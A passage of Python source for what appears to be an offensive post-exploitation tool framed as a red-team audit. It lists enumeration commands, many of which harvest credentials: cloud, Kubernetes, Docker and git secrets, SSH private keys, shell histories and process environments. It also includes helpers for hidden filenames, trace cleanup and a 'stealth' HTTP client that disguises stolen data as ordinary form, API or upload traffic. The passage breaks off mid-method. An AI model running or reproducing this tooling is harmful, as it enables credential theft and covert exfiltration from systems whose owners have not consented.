                "f",
                "-ls",
                "2>/dev/null",
            ),
            "writable_suid": (
                "find",
                "/",
                "-perm",
                "-4000",
                "-writable",
                "-type",
                "f",
                "2>/dev/null",
            ),
            "world_writable_files": (
                "find",
                "/",
                "-perm",
                "-002",
                "-type",
                "f",
                "-ls",
                "2>/dev/null",
            ),
            "world_writable_dirs": (
                "find",
                "/",
                "-perm",
                "-002",
                "-type",
                "d",
                "-ls",
                "2>/dev/null",
            ),
            "world_writable_etc": (
                "find",
                "/etc",
                "-perm",
                "-002",
                "-type",
                "f",
                "2>/dev/null",
            ),
            "noowner_files": ("find", "/", "-nouser", "-ls", "2>/dev/null"),
            "nogroup_files": ("find", "/", "-nogroup", "-ls", "2>/dev/null"),
            # ============ NETWORK ENUMERATION ============
            "all_network_interfaces": ("ip", "-s", "link"),
            "interface_details": ("ip", "addr", "show"),
            "routing_table_detailed": ("ip", "route", "show", "table", "all"),
            "routing_cache": ("ip", "route", "show", "cache"),
            "arp_table_full": ("arp", "-a"),
            "neighbor_table": ("ip", "neigh", "show"),
            "listening_tcp": ("ss", "-tlnp"),
            "listening_udp": ("ss", "-ulnp"),
            "established_tcp": ("ss", "-tnp", "state", "established"),
            "all_sockets_detailed": ("ss", "-anp"),
            "netstat_all": ("netstat", "-anp"),
            "network_statistics": ("netstat", "-s"),
            "open_ports_lsof": ("lsof", "-i", "-P", "-n"),
            "dns_configuration": ("cat", "/etc/resolv.conf"),
            "nsswitch_config": ("cat", "/etc/nsswitch.conf"),
            "hosts_file_full": ("cat", "/etc/hosts"),
            "network_interfaces_config": ("cat", "/etc/network/interfaces"),
            "netplan_config": ("ls", "-la", "/etc/netplan/"),
            "networkmanager_connections": (
                "ls",
                "-la",
                "/etc/NetworkManager/system-connections/",
            ),
            "wireless_networks": ("iwconfig",),
            "vpn_connections": ("ip", "link", "show", "type", "tun"),
            # ============ PROCESS ENUMERATION ============
            "all_processes_detailed": ("ps", "auxww"),
            "process_tree_full": ("pstree", "-apnh"),
            "processes_by_user": ("ps", "aux", "--sort=user"),
            "processes_by_cpu": ("ps", "aux", "--sort=-pcpu", "|", "head", "-20"),
            "processes_by_memory": ("ps", "aux", "--sort=-pmem", "|", "head", "-20"),
            "processes_with_threads": ("ps", "auxH"),
            "process_environment": ("cat", "/proc/*/environ"),
            "process_cmdline": ("cat", "/proc/*/cmdline"),
            "running_as_root": ("ps", "-u", "root", "-U", "root"),
            "processes_listening": ("lsof", "-i", "-n", "-P"),
            "open_files_by_process": ("lsof", "-c"),
            # ============ SERVICE ENUMERATION ============
            "all_systemd_services": (
                "systemctl",
                "list-units",
                "--type=service",
                "--all",
            ),
            "enabled_services_full": (
                "systemctl",
                "list-unit-files",
                "--type=service",
                "--state=enabled",
            ),
            "disabled_services": (
                "systemctl",
                "list-unit-files",
                "--type=service",
                "--state=disabled",
            ),
            "failed_services": ("systemctl", "--failed"),
            "service_dependencies": ("systemctl", "list-dependencies"),
            "systemd_timers_all": ("systemctl", "list-timers", "--all"),
            "init_scripts": ("ls", "-la", "/etc/init.d/"),
            "rc_scripts": ("ls", "-la", "/etc/rc*.d/"),
            "xinetd_services": ("ls", "-la", "/etc/xinetd.d/"),
            # ============ SCHEDULED TASKS ============
            "all_user_crontabs": (
                "for",
                "user",
                "in",
                "$(cut",
                "-f1",
                "-d:",
                "/etc/passwd);",
                "do",
                "crontab",
                "-u",
                "$user",
                "-l;",
                "done",
            ),
            "system_crontab": ("cat", "/etc/crontab"),
            "cron_hourly": ("ls", "-la", "/etc/cron.hourly/"),
            "cron_daily": ("ls", "-la", "/etc/cron.daily/"),
            "cron_weekly": ("ls", "-la", "/etc/cron.weekly/"),
            "cron_monthly": ("ls", "-la", "/etc/cron.monthly/"),
            "cron_d_directory": ("ls", "-la", "/etc/cron.d/"),
            "cron_d_files": (
                "find",
                "/etc/cron.d/",
                "-type",
                "f",
                "-exec",
                "cat",
                "{}",
                ";",
            ),
            "anacron_config": ("cat", "/etc/anacrontab"),
            "at_jobs": ("atq",),
            "at_spool": ("ls", "-la", "/var/spool/cron/atjobs/"),
            "systemd_timers_detailed": (
                "systemctl",
                "list-timers",
                "--all",
                "--no-pager",
            ),
            # ============ FILE SYSTEM ENUMERATION ============
            "mounted_filesystems_full": ("mount", "-l"),
            "fstab_configuration": ("cat", "/etc/fstab"),
            "disk_partitions": ("fdisk", "-l"),
            "block_devices_detailed": ("lsblk", "-f"),
            "lvm_logical_volumes": ("lvdisplay",),
            "lvm_volume_groups": ("vgdisplay",),
            "lvm_physical_volumes": ("pvdisplay",),
            "nfs_exports": ("cat", "/etc/exports"),
            "nfs_mounted": ("showmount", "-e"),
            "smb_shares": ("cat", "/etc/samba/smb.conf"),
            "automount_config": ("cat", "/etc/auto.master"),
            "tmp_directory": ("ls", "-la", "/tmp/"),
            "var_tmp_directory": ("ls", "-la", "/var/tmp/"),
            "dev_shm": ("ls", "-la", "/dev/shm/"),
            # ============ CREDENTIAL ENUMERATION ============
            "ssh_config_system": ("cat", "/etc/ssh/sshd_config"),
            "ssh_config_user": ("cat", "~/.ssh/config"),
            "ssh_known_hosts_system": ("cat", "/etc/ssh/ssh_known_hosts"),
            "ssh_known_hosts_user": ("cat", "~/.ssh/known_hosts"),
            "ssh_authorized_keys_all": (
                "find",
                "/home",
                "-name",
                "authorized_keys",
                "-exec",
                "ls",
                "-la",
                "{}",
                ";",
                "2>/dev/null",
            ),
            "ssh_private_keys_search": (
                "find",
                "/home",
                "-name",
                "id_*sa",
                "-o",
                "-name",
                "id_ecdsa",
                "-o",
                "-name",
                "id_ed25519",
                "2>/dev/null",
            ),
            "ssh_agent_sockets": ("find", "/tmp", "-name", "agent.*", "2>/dev/null"),
            "bash_history_all": (
                "find",
                "/home",
                "-name",
                ".bash_history",
                "-exec",
                "cat",
                "{}",
                ";",
                "2>/dev/null",
            ),
            "zsh_history_all": (
                "find",
                "/home",
                "-name",
                ".zsh_history",
                "-exec",
                "cat",
                "{}",
                ";",
                "2>/dev/null",
            ),
            "mysql_history_all": (
                "find",
                "/home",
                "-name",
                ".mysql_history",
                "-exec",
                "cat",
                "{}",
                ";",
                "2>/dev/null",
            ),
            "psql_history_all": (
                "find",
                "/home",
                "-name",
                ".psql_history",
                "-exec",
                "cat",
                "{}",
                ";",
                "2>/dev/null",
            ),
            "vim_history": (
                "find",
                "/home",
                "-name",
                ".viminfo",
                "-exec",
                "cat",
                "{}",
                ";",
                "2>/dev/null",
            ),
            "less_history": (
                "find",
                "/home",
                "-name",
                ".lesshst",
                "-exec",
                "cat",
                "{}",
                ";",
                "2>/dev/null",
            ),
            "aws_credentials_all": (
                "find",
                "/home",
                "-path",
                "*/.aws/credentials",
                "-exec",
                "cat",
                "{}",
                ";",
                "2>/dev/null",
            ),
            "aws_config_all": (
                "find",
                "/home",
                "-path",
                "*/.aws/config",
                "-exec",
                "cat",
                "{}",
                ";",
                "2>/dev/null",
            ),
            "gcp_credentials": (
                "find",
                "/home",
                "-path",
                "*/.config/gcloud/*",
                "2>/dev/null",
            ),
            "azure_credentials": (
                "find",
                "/home",
                "-path",
                "*/.azure/*",
                "2>/dev/null",
            ),
            "docker_config_all": (
                "find",
                "/home",
                "-path",
                "*/.docker/config.json",
                "-exec",
                "cat",
                "{}",
                ";",
                "2>/dev/null",
            ),
            "kube_config": (
                "find",
                "/home",
                "-path",
                "*/.kube/config",
                "-exec",
                "cat",
                "{}",
                ";",
                "2>/dev/null",
            ),
            "git_credentials_all": (
                "find",
                "/home",
                "-name",
                ".git-credentials",
                "-exec",
                "cat",
                "{}",
                ";",
                "2>/dev/null",
            ),
            "netrc_files": (
                "find",
                "/home",
                "-name",
                ".netrc",
                "-exec",
                "cat",
                "{}",
                ";",
                "2>/dev/null",
            ),
            "filezilla_credentials": (
                "find",
                "/home",
                "-path",
                "*/.filezilla/recentservers.xml",
                "-exec",
                "cat",
                "{}",
                ";",
                "2>/dev/null",
            ),
            "pgpass_files": (
                "find",
                "/home",
                "-name",
                ".pgpass",
                "-exec",
                "cat",
                "{}",
                ";",
                "2>/dev/null",
            ),
            # ============ APPLICATION ENUMERATION ============
            "installed_packages_dpkg": ("dpkg", "-l"),
            "installed_packages_rpm": ("rpm", "-qa"),
            "installed_packages_pacman": ("pacman", "-Q"),
            "apt_sources_list": ("cat", "/etc/apt/sources.list"),
            "apt_sources_d": (
                "find",
                "/etc/apt/sources.list.d/",
                "-type",
                "f",
                "-exec",
                "cat",
                "{}",
                ";",
            ),
            "yum_repos": ("ls", "-la", "/etc/yum.repos.d/"),
            "pip_packages_global": ("pip", "list"),
            "pip3_packages_global": ("pip3", "list"),
            "gem_packages_global": ("gem", "list"),
            "npm_global_packages": ("npm", "list", "-g", "--depth=0"),
            "composer_packages": ("composer", "global", "show"),
            "snap_packages": ("snap", "list"),
            "flatpak_packages": ("flatpak", "list"),
            "docker_images_all": ("docker", "images", "-a"),
            "docker_containers_all": ("docker", "ps", "-a"),
            "docker_networks": ("docker", "network", "ls"),
            "docker_volumes": ("docker", "volume", "ls"),
            # ============ DATABASE ENUMERATION ============
            "mysql_config": ("cat", "/etc/mysql/my.cnf"),
            "mysql_conf_d": (
                "find",
                "/etc/mysql/",
                "-name",
                "*.cnf",
                "-exec",
                "cat",
                "{}",
                ";",
            ),
            "postgresql_config": ("cat", "/etc/postgresql/*/main/postgresql.conf"),
            "postgresql_hba": ("cat", "/etc/postgresql/*/main/pg_hba.conf"),
            "mongodb_config": ("cat", "/etc/mongod.conf"),
            "redis_config": ("cat", "/etc/redis/redis.conf"),
            # ============ WEB SERVER ENUMERATION ============
            "apache_config": ("cat", "/etc/apache2/apache2.conf"),
            "apache_sites_enabled": ("ls", "-la", "/etc/apache2/sites-enabled/"),
            "apache_sites_available": ("ls", "-la", "/etc/apache2/sites-available/"),
            "nginx_config": ("cat", "/etc/nginx/nginx.conf"),
            "nginx_sites_enabled": ("ls", "-la", "/etc/nginx/sites-enabled/"),
            "nginx_sites_available": ("ls", "-la", "/etc/nginx/sites-available/"),
            "web_root_apache": ("ls", "-la", "/var/www/"),
            "web_root_nginx": ("ls", "-la", "/usr/share/nginx/"),
            "php_config": ("cat", "/etc/php/*/apache2/php.ini"),
            "php_fpm_config": ("cat", "/etc/php/*/fpm/php.ini"),
            # ============ SECURITY CONTROLS ============
            "selinux_config": ("cat", "/etc/selinux/config"),
            "selinux_status_detailed": ("sestatus", "-v"),
            "apparmor_profiles": ("ls", "-la", "/etc/apparmor.d/"),
            "apparmor_status_detailed": ("aa-status",),
            "iptables_rules_detailed": ("iptables", "-L", "-n", "-v", "--line-numbers"),
            "iptables_nat": ("iptables", "-t", "nat", "-L", "-n", "-v"),
            "iptables_mangle": ("iptables", "-t", "mangle", "-L", "-n", "-v"),
            "ip6tables_rules": ("ip6tables", "-L", "-n", "-v"),
            "ufw_status_verbose": ("ufw", "status", "verbose"),
            "ufw_rules": ("ufw", "show", "raw"),
            "firewalld_zones": ("firewall-cmd", "--list-all-zones"),
            "firewalld_services": ("firewall-cmd", "--list-services"),
            "fail2ban_jails": ("fail2ban-client", "status"),
            "fail2ban_config": ("cat", "/etc/fail2ban/jail.conf"),
            "hosts_allow": ("cat", "/etc/hosts.allow"),
            "hosts_deny": ("cat", "/etc/hosts.deny"),
            # ============ KERNEL & MODULES ============
            "kernel_version_full": ("uname", "-a"),
            "kernel_modules_loaded": ("lsmod",),
            "kernel_modules_info": ("cat", "/proc/modules"),
            "modprobe_config": ("cat", "/etc/modprobe.d/*"),
            "sysctl_parameters": ("sysctl", "-a"),
            "kernel_parameters": ("cat", "/proc/cmdline"),
            "kernel_security": ("cat", "/proc/sys/kernel/*"),
            "dmesg_output": ("dmesg",),
            # ============ LOGGING & AUDIT ============
            "rsyslog_config": ("cat", "/etc/rsyslog.conf"),
            "syslog_ng_config": ("cat", "/etc/syslog-ng/syslog-ng.conf"),
            "logrotate_config": ("cat", "/etc/logrotate.conf"),
            "logrotate_d": ("ls", "-la", "/etc/logrotate.d/"),
            "auditd_config": ("cat", "/etc/audit/auditd.conf"),
            "audit_rules_file": ("cat", "/etc/audit/rules.d/audit.rules"),
            "audit_rules_active": ("auditctl", "-l"),
            "log_files": ("ls", "-la", "/var/log/"),
            # ============ CONTAINER & VIRTUALIZATION ============
            "container_detection": ("cat", "/proc/1/cgroup"),
            "docker_socket": ("ls", "-la", "/var/run/docker.sock"),
            "docker_env_file": ("cat", "/.dockerenv"),
            "kubernetes_service_account": (
                "ls",
                "-la",
                "/var/run/secrets/kubernetes.io/",
            ),
            "kubernetes_config": ("cat", "/etc/kubernetes/"),
            "lxc_containers": ("lxc-ls", "--fancy"),
            "libvirt_vms": ("virsh", "list", "--all"),
            # ============ BACKUP & RECOVERY ============
            "backup_directories": (
                "find",
                "/",
                "-name",
                "*backup*",
                "-type",
                "d",
                "2>/dev/null",
            ),
            "backup_files": (
                "find",
                "/",
                "-name",
                "*.bak",
                "-o",
                "-name",
                "*.backup",
                "-o",
                "-name",
                "*.old",
                "2>/dev/null",
            ),
            "shadow_backup": ("ls", "-la", "/etc/shadow*"),
            "passwd_backup": ("ls", "-la", "/etc/passwd*"),
        }
        return commands

    @staticmethod
    @functools.lru_cache(maxsize=1)
    def get_privilege_escalation_commands() -> dict[str, Sequence[str]]:
        """Privilege escalation discovery commands.

        These commands identify potential privilege escalation vectors
        including SUID binaries, sudo misconfigurations, capabilities, etc.

        Returns:
            Dictionary mapping command names to command sequences
        """
        commands: dict[str, Sequence[str]] = {
            # SUID/SGID Binaries
        }
        return commands

    @staticmethod
    @functools.lru_cache(maxsize=1)
    def get_persistence_commands() -> dict[str, Sequence[str]]:
        """Persistence mechanism discovery commands.

        These commands identify existing persistence mechanisms and
        potential locations for establishing persistence.

        Returns:
            Dictionary mapping command names to command sequences
        """
        commands: dict[str, Sequence[str]] = {
            # Startup Scripts
        }
        return commands

    @staticmethod
    @functools.lru_cache(maxsize=1)
    def get_lateral_movement_commands() -> dict[str, Sequence[str]]:
        """Lateral movement discovery commands.

        These commands identify network topology, trust relationships,
        and potential targets for lateral movement.

        Returns:
            Dictionary mapping command names to command sequences
        """
        commands: dict[str, Sequence[str]] = {
            # Network Discovery
        }
        return commands

    @staticmethod
    @functools.lru_cache(maxsize=1)
    def get_credential_access_commands() -> dict[str, Sequence[str]]:
        """Credential access and harvesting commands.

        These commands search for credentials in common locations
        including history files, configuration files, and memory.

        Returns:
            Dictionary mapping command names to command sequences
        """
        commands: dict[str, Sequence[str]] = {
            # History Files
        }
        return commands

    @staticmethod
    @functools.lru_cache(maxsize=1)
    def get_exfiltration_commands() -> dict[str, Sequence[str]]:
        """Data exfiltration preparation commands.

        These commands identify sensitive data and prepare it for
        exfiltration. Does not perform actual exfiltration.

        Returns:
            Dictionary mapping command names to command sequences
        """
        commands: dict[str, Sequence[str]] = {
            # Sensitive Files
        }
        return commands

    @staticmethod
    @functools.lru_cache(maxsize=1)
    def get_command_control_commands() -> dict[str, Sequence[str]]:
        """Command and control infrastructure discovery commands.

        These commands identify network configurations, proxies,
        and potential C2 channels.

        Returns:
            Dictionary mapping command names to command sequences
        """
        commands: dict[str, Sequence[str]] = {
            # Network Configuration
        }
        return commands

    @staticmethod
    @functools.lru_cache(maxsize=1)
    def get_defense_evasion_commands() -> dict[str, Sequence[str]]:
        """Defense evasion discovery commands.

        These commands identify security controls, monitoring systems,
        and potential evasion techniques.

        Returns:
            Dictionary mapping command names to command sequences
        """
        commands: dict[str, Sequence[str]] = {
            # Security Software
        }
        return commands

    @staticmethod
    @functools.lru_cache(maxsize=1)
    def get_forensics_commands() -> dict[str, Sequence[str]]:
        """Forensics and incident response commands.

        These commands collect forensic artifacts for blue team
        analysis and incident response activities.

        Returns:
            Dictionary mapping command names to command sequences
        """
        commands: dict[str, Sequence[str]] = {
            # System State
        }
        return commands

    @staticmethod
    def get_phase_commands(phase: RedTeamPhase) -> dict[str, Sequence[str]]:
        """Get commands for a specific red team phase.

        Args:
            phase: The red team phase to get commands for

        Returns:
            Dictionary mapping command names to command sequences

        Raises:
            PhaseNotImplementedError: If phase is not implemented
        """
        phase_map = {
            RedTeamPhase.RECONNAISSANCE: CommandRegistry.get_reconnaissance_commands,
            RedTeamPhase.ENUMERATION: CommandRegistry.get_enumeration_commands,
            RedTeamPhase.PRIVILEGE_ESCALATION: CommandRegistry.get_privilege_escalation_commands,
            RedTeamPhase.PERSISTENCE: CommandRegistry.get_persistence_commands,
            RedTeamPhase.LATERAL_MOVEMENT: CommandRegistry.get_lateral_movement_commands,
            RedTeamPhase.CREDENTIAL_ACCESS: CommandRegistry.get_credential_access_commands,
            RedTeamPhase.EXFILTRATION: CommandRegistry.get_exfiltration_commands,
            RedTeamPhase.COMMAND_CONTROL: CommandRegistry.get_command_control_commands,
            RedTeamPhase.DEFENSE_EVASION: CommandRegistry.get_defense_evasion_commands,
            RedTeamPhase.FORENSICS: CommandRegistry.get_forensics_commands,
        }

        if phase == RedTeamPhase.FULL_AUDIT:
            # Combine all phases
            all_commands: dict[str, Sequence[str]] = {}
            for phase_func in phase_map.values():
                all_commands.update(phase_func())
            return all_commands

        if phase == RedTeamPhase.CUSTOM:
            # Return empty dict for custom commands
            return {}

        command_func = phase_map.get(phase)
        if command_func is None:
            raise PhaseNotImplementedError(f"Phase {phase.value} is not implemented")

        return command_func()

    @staticmethod
    def get_all_commands(
        phase: RedTeamPhase | None = None,
        custom_commands: dict[str, Sequence[str]] | None = None,
    ) -> dict[str, Sequence[str]]:
        """Get all commands for execution.

        Args:
            phase: Red team phase (defaults to RECONNAISSANCE)
            custom_commands: Optional custom commands to add/override

        Returns:
            Dictionary mapping command names to command sequences
        """
        if phase is None:
            phase = RedTeamPhase.RECONNAISSANCE

        # Get base commands for phase
        if phase == RedTeamPhase.CUSTOM and custom_commands:
            commands = custom_commands.copy()
        else:
            commands = CommandRegistry.get_phase_commands(phase)

        # Merge custom commands if provided
        if custom_commands:
            commands.update(custom_commands)

        return commands

    @staticmethod
    def filter_commands(
        commands: dict[str, Sequence[str]],
        include: set[str] | None = None,
        exclude: set[str] | None = None,
    ) -> dict[str, Sequence[str]]:
        """Filter commands based on include/exclude sets.

        Args:
            commands: Base command dictionary
            include: Set of command names to include (None = include all)
            exclude: Set of command names to exclude

        Returns:
            Filtered command dictionary
        """
        filtered = commands.copy()

        # Apply include filter
        if include:
            filtered = {k: v for k, v in filtered.items() if k in include}

        # Apply exclude filter
        if exclude:
            filtered = {k: v for k, v in filtered.items() if k not in exclude}

        return filtered


# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================


def json_serializer(value: Any) -> Any:
    """Custom JSON serializer for non-standard types."""
    if isinstance(value, datetime):
        return value.isoformat()

    if isinstance(value, Path):
        return str(value)

    if isinstance(value, Enum):
        return value.value

    if isinstance(value, bytes):
        return base64.b64encode(value).decode("ascii")

    if isinstance(value, set):
        return list(value)

    if hasattr(value, "to_dict") and callable(value.to_dict):
        return value.to_dict()

    raise TypeError(
        f"Object of type {type(value).__name__} (value: {value!r}) "
        f"is not JSON serializable"
    )


def calculate_size(data: str | bytes) -> int:
    """Calculate size of data in bytes."""
    if isinstance(data, str):
        return len(data.encode("utf-8"))
    return len(data)


def format_size(size_bytes: int) -> str:
    """Format byte size as human-readable string."""
    units: tuple[str, ...] = ("B", "KB", "MB", "GB", "TB", "PB")
    size: float = float(size_bytes)

    for unit in units[:-1]:
        if size < 1024.0:
            return f"{size:.2f} {unit}"
        size /= 1024.0

    return f"{size:.2f} {units[-1]}"


def compress_data(data: str | bytes, method: CompressionMethod) -> bytes:
    """Compress data using specified method."""
    data_bytes: bytes = data if isinstance(data, bytes) else data.encode("utf-8")

    match method:
        case CompressionMethod.GZIP:
            return gzip.compress(data_bytes, compresslevel=6)
        case CompressionMethod.BASE64:
            return base64.b64encode(data_bytes)
        case CompressionMethod.NONE:
            return data_bytes
        case _:
            logger.debug(f"Unknown compression method: {method}, using NONE")
            return data_bytes


def decompress_data(data: bytes, method: CompressionMethod) -> bytes:
    """Decompress data using specified method."""
    match method:
        case CompressionMethod.GZIP:
            return gzip.decompress(data)
        case CompressionMethod.BASE64:
            return base64.b64decode(data)
        case CompressionMethod.NONE:
            return data
        case _:
            logger.debug(f"Unknown compression method: {method}, returning as-is")
            return data


def truncate_string(
    text: str,
    max_length: int,
    suffix: str = "...",
) -> tuple[str, bool]:
    """Truncate string to maximum length."""
    if len(text) <= max_length:
        return text, False

    truncated_length = len(text) - max_length
    truncated = (
        f"{text[:max_length]}{suffix} [truncated {truncated_length:,} characters]"
    )
    return truncated, True


def sanitize_filename(filename: str) -> str:
    """Sanitize filename by removing/replacing invalid characters."""
    # Replace invalid characters with underscore
    invalid_chars = '<>:"/\\|?*'
    for char in invalid_chars:
        filename = filename.replace(char, "_")

    # Remove leading/trailing spaces and dots
    filename = filename.strip(". ")

    # Limit length
    if len(filename) > 255:
        filename = filename[:255]

    return filename or "unnamed"


def generate_audit_id() -> str:
    """Generate unique audit ID."""
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    random_suffix = base64.b32encode(os.urandom(5)).decode("ascii").rstrip("=")
    return f"audit_{timestamp}_{random_suffix}"


def generate_innocuous_filename(extension: str = "dat") -> str:
    """Generate filename that blends in with system files."""
    prefixes = [
        "system",
        "update",
        "cache",
        "tmp",
        "log",
        "config",
        "session",
        "state",
        "lock",
        "pid",
        "socket",
    ]

    prefix = random.choice(prefixes)
    random_id = secrets.token_hex(4)

    return f".{prefix}-{random_id}.{extension}"


def validate_command(command: Sequence[str]) -> bool:
    """Validate command structure."""
    if not command:
        return False

    if not all(isinstance(arg, str) for arg in command):
        return False

    if not command[0]:  # Empty first element
        return False

    return True


def get_system_info() -> dict[str, Any]:
    """Get basic system information."""
    return {
        "hostname": socket.gethostname(),
        "platform": os.name,
        "python_version": f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}",
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }


def calculate_execution_stats(checks: dict[str, CheckResult]) -> dict[str, Any]:
    """Calculate execution statistics from check results."""
    total = len(checks)
    if total == 0:
        return {
            "total": 0,
            "successful": 0,
            "failed": 0,
            "errors": 0,
            "success_rate": 0.0,
            "total_execution_time": 0.0,
            "average_execution_time": 0.0,
        }

    status_counts = {
        "successful": 0,
        "failed": 0,
        "errors": 0,
        "timeouts": 0,
        "not_found": 0,
        "permission_denied": 0,
    }

    total_time = 0.0

    for check in checks.values():
        status = check.get("status", CheckStatus.ERROR.value)

        if status == CheckStatus.SUCCESS.value:
            status_counts["successful"] += 1
        elif status == CheckStatus.FAILED.value:
            status_counts["failed"] += 1
        elif status == CheckStatus.TIMEOUT.value:
            status_counts["timeouts"] += 1
        elif status == CheckStatus.NOT_FOUND.value:
            status_counts["not_found"] += 1
        elif status == CheckStatus.PERMISSION_DENIED.value:
            status_counts["permission_denied"] += 1
        else:
            status_counts["errors"] += 1

        total_time += check.get("execution_time", 0.0)

    success_rate = (status_counts["successful"] / total) * 100 if total > 0 else 0.0
    avg_time = total_time / total if total > 0 else 0.0

    return {
        "total": total,
        "successful": status_counts["successful"],
        "failed": status_counts["failed"],
        "errors": status_counts["errors"],
        "timeouts": status_counts["timeouts"],
        "not_found": status_counts["not_found"],
        "permission_denied": status_counts["permission_denied"],
        "success_rate": round(success_rate, 2),
        "total_execution_time": round(total_time, 2),
        "average_execution_time": round(avg_time, 2),
    }


def create_metadata(config: AuditConfiguration) -> dict[str, Any]:
    """Create metadata dictionary for audit."""
    metadata = {
        "audit_id": generate_audit_id(),
        "system_info": get_system_info(),
        "configuration": {
            "phase": config.red_team_phase.value,
            "operation_mode": config.operation_mode.value,
            "export_format": config.export_format.value,
            "transmission_method": config.transmission_method.value,
            "send_mode": config.send_mode.value,
        },
        "execution_mode": "PREFECT" if PREFECT_ENABLED else "STANDALONE",
    }

    if config.operator:
        metadata["operator"] = config.operator

    if config.mission_id:
        metadata["mission_id"] = config.mission_id

    if config.tags:
        metadata["tags"] = config.tags

    return metadata


async def safe_file_write_with_tracking(
    path: Path,
    content: str | bytes,
    config: AuditConfiguration,
) -> bool:
    """Write file with tracking for cleanup."""
    # If memory_only mode, store in memory instead
    if config.memory_only:
        trace_manager = get_trace_manager()
        content_bytes = (
            content if isinstance(content, bytes) else content.encode("utf-8")
        )
        return trace_manager.get_memory_storage().store(str(path), content_bytes)

    # Otherwise write to disk and track
    try:
        await asyncio.to_thread(path.parent.mkdir, parents=True, exist_ok=True)

        if isinstance(content, bytes):
            with Path(path).open("wb") as f:
                f.write(content)
        else:
            with Path(path).open("w", encoding="utf-8") as f:
                f.write(content)

        # Track for cleanup
        if config.auto_cleanup:
            trace_manager = get_trace_manager()
            trace_manager.register_created_file(path)

        return True

    except Exception as e:
        logger.debug(f"Failed to write file {path}: {e}")
        return False


# ============================================================================
# STEALTH HTTP CLIENT
# ============================================================================


@final
class StealthHTTPClient:
    """HTTP client that mimics normal browser traffic."""

    def __init__(self, config: AuditConfiguration):
        self.config = config
        self.session_cookies: dict[str, str] = {}

        # Realistic user agents (updated 2024)
        self.user_agents = [
            # Chrome on Windows
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            # Firefox on Windows
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            # Edge on Windows
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            # Chrome on macOS
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            # Safari on macOS
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            # Chrome on Linux
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            # Firefox on Linux
            "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        ]

        # Common accept headers
        self.accept_headers = [
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "*/*",
        ]

        # Common accept-language headers
        self.accept_languages = [
            "en-US,en;q=0.9",
            "en-GB,en;q=0.9",
            "en-US,en;q=0.5",
            "en-US,en;q=0.8",
        ]

    def _generate_realistic_headers(
        self, content_type: str = "application/json"
    ) -> dict[str, str]:
        """Generate realistic browser headers."""
        headers = {
            "User-Agent": random.choice(self.user_agents),
            "Accept": random.choice(self.accept_headers),
            "Accept-Language": random.choice(self.accept_languages),
            "Accept-Encoding": "gzip, deflate, br",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Cache-Control": "max-age=0",
        }

        # Add cookies if we have any
        if self.session_cookies:
            cookie_str = "; ".join([
                f"{k}={v}" for k, v in self.session_cookies.items()
            ])
            headers["Cookie"] = cookie_str

        # Add content-type for POST requests
        if content_type:
            headers["Content-Type"] = content_type

        return headers

    def _disguise_as_form(self, data: bytes) -> tuple[bytes, str]:
        """Disguise JSON data as form submission."""
        # Encode data in base64
        encoded = base64.b64encode(data).decode()

        # Create fake form data
        fake_form = {
            "username": f"user{random.randint(1000, 9999)}",
            "session_id": secrets.token_hex(16),
            "csrf_token": secrets.token_hex(32),
            "data": encoded,  # Real data hidden here
            "timestamp": str(int(time.time())),
            "action": random.choice(["login", "update", "submit", "save"]),
        }

        # URL encode
        form_data = urllib.parse.urlencode(fake_form).encode()
        content_type = "application/x-www-form-urlencoded"

        return form_data, content_type

    def _disguise_as_json_api(self, data: bytes) -> tuple[bytes, str]:
        """Disguise data as API call."""
        # Encode data
        encoded = base64.b64encode(data).decode()

        # Create fake API payload
        fake_payload = {
            "api_version": "v2",
            "client_id": secrets.token_hex(8),
            "request_id": str(uuid.uuid4()),
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "payload": encoded,  # Real data
            "checksum": hashlib.md5(encoded.encode()).hexdigest(),
        }

        json_data = json.dumps(fake_payload).encode()
        content_type = "application/json"

        return json_data, content_type

    def _disguise_as_multipart(self, data: bytes) -> tuple[bytes, str]:
        """Disguise data as file upload."""
        boundary = f"----WebKitFormBoundary{secrets.token_hex(16)}"

        # Encode data
        encoded = base64.b64encode(data)

        # Create multipart form data
        parts = []

        # Add fake form fields
        parts.append(f"--{boundary}\r\n")
        parts.append('Content-Disposition: form-data; name="upload_type"\r\n\r\n')
        parts.append("document\r\n")

        # Add "file" with real data
        parts.append(f"--{boundary}\r\n")
        parts.append(
            'Content-Disposition: form-data; name="file"; filename="document.txt"\r\n'
        )
        parts.append("Content-Type: text/plain\r\n\r\n")

        multipart_data = (
            "".join(parts).encode() + encoded + f"\r\n--{boundary}--\r\n".encode()
        )
        content_type = f"multipart/form-data; boundary={boundary}"

        return multipart_data, content_type

    async def send_stealthy(
        self,
        url: str,
        data: bytes,
        max_retries: int = 3,
        timeout: int = 60,
    ) -> bool:
        """Send data with stealth techniques."""
        # Randomly choose disguise method
        disguise_methods = [
            self._disguise_as_form,
            self._disguise_as_json_api,
            self._disguise_as_multipart,
        ]

        disguise_method = random.choice(disguise_methods)
        disguised_data, content_type = disguise_method(data)

        # Generate realistic headers
